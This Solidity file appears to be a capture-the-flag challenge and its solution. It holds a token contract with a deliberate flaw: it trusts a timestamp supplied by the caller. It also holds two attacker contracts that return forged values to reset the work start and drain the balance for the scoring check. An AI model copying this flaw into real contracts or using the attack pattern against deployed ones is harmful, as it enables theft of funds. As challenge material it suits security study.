//SPDX-License-Identifier: UNLICENSED

// 1.workingNumber增加.2.合约余额归零
pragma solidity ^0.8.0;
interface Itime{
    function timestamp()external returns(uint256);
}
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract ERC20 is IERC20 {

    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 1000 ether;


   constructor() {}

    function totalSupply() public override view returns (uint256) {
    return totalSupply_;
    }

    function mint(address _addr,uint256 amount)internal{
        balances[_addr]+=amount;
        totalSupply_+=amount;
    }

    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender]-numTokens;
        balances[receiver] = balances[receiver]+numTokens;
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner]-numTokens;
        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;
        balances[buyer] = balances[buyer]+numTokens;
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
}

// 1.workingNumber增加.2.合约余额归零
contract worker is ERC20{

    struct workUser{
        uint256 startNumber;
        uint256 workingNumber;
    }
    mapping(address => workUser) public workusers;
    constructor(){
        mint(address(this),block.number);
    }

    function timestamp()public view returns(uint256){
        return block.number;
    }
    function itimestamp()public returns(uint256 a){
        a = Itime(address(this)).timestamp();
    }

    function work(uint256 _workingNumber)public{
        workUser storage user = workusers[msg.sender];
        user.startNumber = Itime(address(this)).timestamp();
        user.workingNumber=_workingNumber;
    }

    function finish()public{
        workUser storage user = workusers[msg.sender];
        require(block.number>=user.startNumber+user.workingNumber);

        this.transfer(msg.sender,user.workingNumber);
        delete(workusers[msg.sender]);
    }

    function updateStart()public{
        workUser storage user = workusers[msg.sender];
        require(Itime(address(msg.sender)).timestamp()>user.startNumber);
        user.startNumber = Itime(address(msg.sender)).timestamp();
    }

}

contract attract{
    check che;
    bool b;
    constructor(address addr)public {
        che = check(addr);
    }
    function timestamp()external returns(uint256 a){
        if(!b){
            a = block.number + 100;
            b = true;
        }else{
            a = 0;
        }
    }
    function att1() public {
        che.work(51);
        che.updateStart();
    }
    function att2() public {
        che.finish();
    }
    function att3() public {
        che.work(22);
        che.isCompleted();
    }
}

contract check is worker{
    uint256 public score;
    function isCompleted()public{
        score=0;
        if(workusers[msg.sender].workingNumber!=0){
            score+=25;
        }
        if (balances[address(this)]==0){
            score+=75;
        }
    }
}
contract att{
    check che;
    constructor(check addr) {
        che = addr;
    }
    bool a;
    function timestamp() external returns(uint256){
        uint b ;
        if (!a){
            b =  block.number + 10;
            a = true;
        }else{
            b = 0;
        }
        return b;
    }
    function attrack() public {
        che.work(23);
        che.updateStart();
    }
    function attrack2() public {
        che.finish();
    }
    function attrack3() public {
        che.work(10);
        che.isCompleted();
    }

}